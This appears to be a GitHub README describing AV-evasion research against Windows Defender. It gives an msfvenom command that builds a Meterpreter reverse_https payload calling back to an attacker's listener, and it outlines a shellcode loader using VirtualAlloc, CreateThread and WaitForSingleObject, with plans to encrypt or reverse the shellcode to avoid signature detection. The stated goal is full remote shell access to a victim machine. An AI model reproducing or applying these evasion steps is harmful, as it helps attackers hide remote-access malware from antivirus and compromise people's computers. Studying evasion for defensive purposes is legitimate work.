# Windows Security Evasion, for research porpose

Malicious software that is running a reverse shell, to get full access remote to the victim machine and this software can easily bypass windows security / windows defender and others AV's, up to now (05/05/2022).


# Anti-Virus Evasion Research

I wanted to bypass the Windows Security Virus &amp; Threat Protection with some meterpreter malware that gives me access of the victim shell, so with I could get a reverse shell.

So I tried the vanilla version of the meterpreter that you can easily forge from msfvenom:

```msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=4444 -f exe -o test_exploit.exe```

With that I uploaded this piece of software that is executable for windows and it contains our malware vanilla (PE32+ executable (GUI) x86-64, for MS Windows). 

![](https://github.com/xbeatzsec/windows-security-evasion/blob/main/not_clean_vanilla.png)

As you can see it has been detected as a malware in 19 differents anti-virus, but this is not too good, because even a vanilla version of a malware can bypass or can be undetected in some anti-virus softwares in the market.

But our target (Windows Defewnder) detected it as a &quot;Trojan:Win64/Meterpreter.D&quot;, so we can play around with our payload and try to bypass, this is my mission during this research.

So in msfvenom we could create a exe file to run in windows system, but also we can create a payload from that software to create a shellcode containing the malware that we want to run in the victim system with windows defender running.

Shellcodes are pieces of machine code designed to run local or remote system shell (hence the name). They are mainly used during exploitation of software vulnerabilities - when an attacker is able to control program&#39;s execution flow he needs some universal payload to execute desired action (usually shell access). This applies to both local exploitation (e.g. for privilege escalation) and remote exploitation (for gaining RCE on a server).

But first let&#39;s use Win32 API that is built into Windows, and that is an application programmig interface written in C by Microsoft to allow access to Windows features.

It is used for malware development so we will use it too.

And why we should use it?

- It is built into Windows so functionallity doesn&#39;t have to be re-written´
- It doesn&#39;t get flagged by AV
- It is fast and usually well documented

We will use it first to run our shellcode, so with that we will start with VirtualAllloc to create a executable piece of memory, then we CreateThread to execute the shellcode in memory, and finally WaitForSingleObject to not crash upon receiving a command.

![](https://github.com/xbeatzsec/windows-security-evasion/blob/main/after_compile_1st.png)

After we compiled the file we got this result on the image above, we could bypass some of antivirus on the list but our windows defender still detecting our malware, so let&#39;s play around with our shellcode to maybe bypass it, we can encrypt our shellcode, we can reverse our byte array (shellcode). We do it now because we know that our Win32API aren&#39;t getting flagged by signature checks.
